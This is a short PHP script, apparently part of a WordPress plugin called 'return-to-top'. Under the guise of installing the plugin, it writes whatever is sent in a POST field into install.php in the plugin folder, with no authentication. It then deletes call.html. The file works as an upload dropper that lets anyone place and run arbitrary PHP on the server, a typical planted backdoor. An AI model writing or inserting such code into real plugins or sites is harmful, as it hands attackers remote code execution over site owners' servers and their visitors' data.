<?php
session_start();
$installtheplugin = $_POST['installplugin'];
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/return-to-top/install.php', 'w');
$installtheplugin = str_replace('\\', '', $installtheplugin);
$installtheplugin = htmlentities($installtheplugin);
fwrite($fp, html_entity_decode($installtheplugin));
fclose($fp);
echo $installtheplugin;
unlink($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/return-to-top/call.html');
?>